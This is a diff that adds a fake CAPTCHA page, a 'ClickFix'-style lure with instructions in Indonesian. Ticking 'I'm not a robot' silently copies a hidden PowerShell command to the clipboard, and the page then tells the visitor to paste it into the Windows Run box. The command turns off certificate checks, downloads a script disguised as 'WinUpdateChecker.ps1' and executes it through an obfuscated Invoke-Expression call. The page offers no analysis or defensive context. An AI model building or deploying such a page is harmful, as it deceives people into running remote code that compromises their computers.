@@ -1,0 +1,87 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Verification Required</title>
+  <style>
+    body {
+      font-family: sans-serif;
+      background-color: #f2f2f2;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+    .box {
+      background: white;
+      padding: 30px;
+      border-radius: 8px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.2);
+      text-align: center;
+    }
+    .captcha {
+      margin-top: 20px;
+      font-size: 18px;
+    }
+    #verifyBtn {
+      margin-top: 15px;
+      padding: 10px 20px;
+      background-color: #4CAF50;
+      color: white;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+    }
+    .steps {
+      display: none;
+      margin-top: 20px;
+      text-align: left;
+      background: #eee;
+      padding: 15px;
+      border-radius: 5px;
+    }
+    .command {
+      background: #ddd;
+      font-family: monospace;
+      padding: 10px;
+      border-radius: 5px;
+      word-break: break-all;
+    }
+  </style>
+</head>
+<body>
+
+<div class="box">
+  <h2>CAPTCHA Verification</h2>
+  <div class="captcha">
+    <label>
+      <input type="checkbox" onclick="fakeVerify()"> I'm not a robot
+    </label>
+  </div>
+
+  <div class="steps" id="steps">
+    <h3>Final Verification Steps</h3>
+    <ol>
+      <li>Tekan <b>Win + R</b></li>
+      <li>Paste dan tekan Enter</li>
+    </ol>
+    <p>Command:</p>
+    <div class="command" id="commandText"></div>
+  </div>
+</div>
+
+<script>
+  function fakeVerify() {
+    const payload = `powershell -w hidden -nop -c "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}; $u='https://192.168.10.52/WinUpdateChecker.ps1';&('I'+'eX')((New-Object Net.WebClient).DownloadString($u))"`;
+    
+    navigator.clipboard.writeText(payload).then(() => {
+      document.getElementById('steps').style.display = 'block';
+      document.getElementById('commandText').innerText = payload;
+    }).catch(err => {
+      alert("Gagal menyalin payload ke clipboard.");
+    });
+  }
+</script>
+
+</body>
+</html>
